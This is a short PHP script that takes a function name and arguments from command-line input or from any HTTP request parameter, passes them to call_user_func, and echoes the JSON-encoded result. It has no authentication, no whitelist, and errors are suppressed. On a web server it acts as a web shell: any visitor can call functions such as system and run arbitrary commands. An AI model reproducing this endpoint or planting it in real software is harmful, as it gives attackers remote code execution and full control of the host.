<?php
if(isset($argv[1])){
	array_shift($argv);
	$_REQUEST['func_name']=array_shift($argv);
	$_REQUEST['arg']=$argv;
}
if(isset($_REQUEST['func_name'])){
	$func_name=$_REQUEST['func_name'];
	$arg=empty($_REQUEST['arg'])?[]:$_REQUEST['arg'];
	if(is_string($arg)){
		if($array=json_decode($arg,1)){
			$arg=$array;
		}
	}
	echo @json_encode(call_user_func($func_name,$arg));
}